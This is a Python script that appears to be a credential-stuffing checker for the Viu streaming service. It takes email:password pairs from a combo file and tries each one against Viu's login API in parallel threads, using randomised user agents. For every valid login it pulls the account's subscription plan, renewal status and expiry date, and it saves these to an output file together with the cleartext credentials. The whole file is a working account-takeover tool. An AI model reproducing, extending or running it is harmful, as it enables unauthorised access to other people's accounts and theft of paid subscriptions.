from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
from datetime import datetime, timedelta, timezone
import uuid
import re
import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
def generate_guid():
    return str(uuid.uuid4())

def validate_credentials_format(creds):
    try:
        email, password = creds.split(':')
        return email, password
    except ValueError:
        return None, None

def viucheck(creds):
    guid = generate_guid()
    ua = UserAgent()
    random_user_agent = ua.random
    creds = creds.strip()
    if not creds:
        return None

    email, password = validate_credentials_format(creds)
    if not email or not password:
        return None
    login_data = {
        "email": email,
        "password": password,
        "provider": "email"
    }
    email = email
    password = password
    # Get token request
    get_token_url = "https://api-gateway-global.viu.com/api/auth/token?platform_flag_label=web&area_id=5&language_flag_id=3&platformFlagLabel=web&areaId=5&languageFlagId=3&countryCode=PH"
    get_token_headers = {
        "User-Agent": random_user_agent,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.viu.com/",
        "Content-Type": "application/json"
    }
    get_token_data = {
        "appVersion": "3.17.3",
        "countryCode": "PH",
        "language": "3",
        "platform": "browser",
        "platformFlagLabel": "web",
        "uuid": guid,
        "carrierId": "0"
    }
    get_token_response = requests.post(get_token_url, json=get_token_data, headers=get_token_headers)
    at = re.search(r"token\":\"(.*?)\"}", get_token_response.text).group(1)
    
    # Login request
    login_url = "https://api-gateway-global.viu.com/api/auth/login"
    login_headers = {
        "Host": "api-gateway-global.viu.com",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Authorization": f"Bearer {at}",
        "Origin": "https://umc-global.viu.com",
        "User-Agent": random_user_agent,
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Referer": "https://umc-global.viu.com/?platform=android",
        "Accept-Language": "en-PH,en-US;q=0.9",
        "X-Requested-With": "com.viu.pad",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "73"
    }

    login_response = requests.post(login_url, json=login_data, headers=login_headers)
    
    # Check login response
    if any(key in login_response.text for key in ["status\":0", "Password must be in 6\\u201320 alphanumeric characters format.", "The email and password combination you have submitted is invalid", "error.user.auth.failed"]) or "401" in str(login_response.status_code):
        print("Login failed.")
        return None
    
    nickname = re.search(r"nickname\":\"(.*?)\"", login_response.text)
    if nickname:
        nickname = nickname.group(1)
        print(f"Email Password: {login_data}")
    else:
        print("Failed to extract nickname from login_response.")
    
    at1 = re.search(r"token\":\"(.*?)\"}", login_response.text)
    if at1:
        at1 = at1.group(1)
    else:
        print("Failed to extract token from login_response.")
        return None
    
    # User info request
    user_info_url = "https://api-gateway-global.viu.com/spu/bff/v2/paymentDetail?platform_flag_label=web&area_id=5&language_flag_id=3&platformFlagLabel=web&areaId=5&languageFlagId=3&countryCode=PH&ut=2"
    user_info_headers = {
        "platform": "android",
        "Authorization": f"Bearer {at1}",
        "Host": "api-gateway-global.viu.com",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1",
        "Accept-Encoding": "gzip, deflate"
    }
    user_info_response = requests.get(user_info_url, headers=user_info_headers)
    result = []
    result.append(f"Email Password : {email}:{password}")
    response_json = json.loads(user_info_response.text)
    if response_json['data']['subscription'] and (response_json['data']['subscription']['premiumUntil'] or response_json['data']['subscription']['planValidUntil']):
        # print(response_json['data']['subscription'])        
        result.append(f"Mode: {response_json['data']['subscription']['provider']}")
        result.append(f"Plan: {response_json['data']['subscription']['skuInfo']['partnerSkuName']}")
        result.append(f"Auto_Renew: {response_json['data']['subscription']['isRecurringSubscription']}")

        if response_json['data']['subscription']['premiumUntil'] :
            time_prem = response_json['data']['subscription']['premiumUntil']
        else:
            time_prem = response_json['data']['subscription']['planValidUntil']
        date_time_utc = datetime.fromtimestamp(int(time_prem), timezone.utc)  # Use timezone-aware object in UTC
        cst_timezone = timezone(timedelta(hours=8))
        date_time_cst = date_time_utc.astimezone(cst_timezone)
        expiry_date = date_time_cst.strftime('%Y-%m-%d')

        result.append(f"Expiration: {expiry_date}")
    else:
        result.append(f"Plan: BEYSIK_PLAN")
    result.append("Config: By VONEZ")
    return " | ".join(result)
def main():
    start_time = time.time()
    try:
        with open('viuep.txt', 'r', encoding='utf-8', errors='ignore') as input_file:
            creds_list = [line.strip() for line in input_file if line.strip()]
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(viucheck, creds) for creds in creds_list]
            results = [future.result() for future in as_completed(futures) if future.result() is not None]

        with open('viu_res_ep.txt', 'a') as file:
            file.write('\n'.join(results))

        end_time = time.time()
        total_time = end_time - start_time 

        print(f"Processing completed successfully in {total_time:.2f} seconds")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()